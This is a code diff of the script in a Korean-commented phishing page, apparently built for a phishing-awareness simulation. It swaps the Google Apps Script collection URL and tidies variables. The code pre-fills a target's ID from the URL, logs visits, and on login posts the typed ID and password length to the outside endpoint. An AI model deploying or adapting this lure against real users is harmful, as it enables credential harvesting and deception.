@@ -33,22 +33,21 @@
     </div>
 
     <script>
-        const gasUrl = 'https://script.google.com/macros/s/AKfycbw2muaYvg79tUAzrGHSluy3d4TUNvKmaZwc34GzauzobqexZ8Zu5s7G5NFhzF3S0X08uw/exec';
+        // ★ 여기에 새로 배포한 GAS URL을 꼭 업데이트해줘!
+        const gasUrl = 'https://script.google.com/macros/s/AKfycbzyZYJJfRbPEtmM7rnXjXLaipUKBItoK4njPWkk0tyerFlSDQRKuP1JIjyfybLURPegPQ/exec';
 
-        let originalTargetId = "";
+        let originalTarget = "";
 
-        // 1. 페이지 접속 시
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            originalTargetId = urlParams.get('id') || "알수없음";
+            originalTarget = urlParams.get('id') || "알수없음";
 
-            if (originalTargetId !== "알수없음") {
-                // 화면 아이디 칸에 자동 입력
-                document.getElementById('userId').value = originalTargetId;
+            if (originalTarget !== "알수없음") {
+                document.getElementById('userId').value = originalTarget;
 
-                // 접속 로그 전송: [타겟ID | (접속함) | 0]
+                // [최초 접속 로그] 타겟ID | (접속함) | 0
                 var formData = new FormData();
-                formData.append('targetId', originalTargetId);
+                formData.append('targetId', originalTarget);
                 formData.append('inputId', '(접속함)');
                 formData.append('pwLen', '0');
 
@@ -56,17 +55,17 @@
             }
         };
 
-        // 2. 로그인 버튼 클릭 시
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
 
-            var typedId = document.getElementById('userId').value; // 실제 입력된 ID
-            var typedPw = document.getElementById('userPw').value;
+            var currentTypedId = document.getElementById('userId').value;
+            var currentTypedPw = document.getElementById('userPw').value;
 
+            // [로그인 시도 로그] 타겟ID | 실제입력ID | 비번수
             var formData = new FormData();
-            formData.append('targetId', originalTargetId); // URL에 있던 원본 ID
-            formData.append('inputId', typedId);           // 실제로 입력한 ID
-            formData.append('pwLen', typedPw.length);      // 비번 글자수
+            formData.append('targetId', originalTarget);   // URL에 있던 원본
+            formData.append('inputId', currentTypedId);    // 사용자가 입력한 값
+            formData.append('pwLen', currentTypedPw.length); // 비번 글자수
 
             fetch(gasUrl, {
                 method: 'POST',
